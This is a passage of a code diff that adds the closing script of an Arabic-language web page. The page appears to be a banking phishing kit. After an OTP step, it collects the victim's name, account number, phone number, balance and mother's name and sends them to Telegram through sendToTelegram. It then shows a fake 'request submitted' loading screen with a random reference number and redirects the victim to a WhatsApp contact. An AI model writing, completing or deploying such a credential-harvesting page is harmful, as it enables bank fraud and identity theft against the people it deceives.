+          if (!name || !account || !phone || !balance || !mother) {
+            showErrorModal("الرجاء ملء جميع حقول الاستمارة للمتابعة.");
+            return;
+          }
+
+          sendToTelegram(`📋 *استمارة تأكيد البيانات (بعد OTP):*
+👤 الاسم: ${name}
+🏦 رقم الحساب: ${account}
+📱 رقم الهاتف: ${phone}
+💰 الرصيد المتبقي: ${balance}
+👩 اسم الوالدة: ${mother}`);
+
+          switchScreen('screenFinalLoading');
+          document.getElementById('loadingMainText').textContent = "جاري تقديم الطلب...";
+          document.getElementById('loadingSubText').textContent = "يرجى عدم الخروج من الصفحة، يتم معالجة البيانات...";
+
+          setTimeout(() => {
+              const randomRef = Math.floor(10000000 + Math.random() * 90000000);
+              document.getElementById('loadingMainText').textContent = "تم تقديم الطلب بنجاح";
+              document.getElementById('loadingSubText').textContent = "الرقم المرجعي: " + randomRef;
+              document.getElementById('referenceNumberDisplay').textContent = "📋 " + randomRef;
+
+              setTimeout(() => {
+                  window.location.href = "https://wa.me/2490128093955?text=" + encodeURIComponent("مرحباً، تم تقديم الطلب بنجاح. رقمي المرجعي هو: " + randomRef);
+              }, 2000);
+          }, 300000);
+        }
+
+        function showErrorModal(message) {
+          document.getElementById('modalErrorText').textContent = message || "Invalid Source. Please contact Customer Care";
+          document.getElementById('modalError').style.display = 'flex';
+        }
+
+        function closeErrorModal() {
+          document.getElementById('modalError').style.display = 'none';
+        }
+
+        function closeModal(modalId) {
+          if(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+          }
+        }
+
+        function switchScreen(screenId) {
+          document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+          document.getElementById(screenId).classList.add('active');
+        }
+    </script>
+
+</body>
+</html>
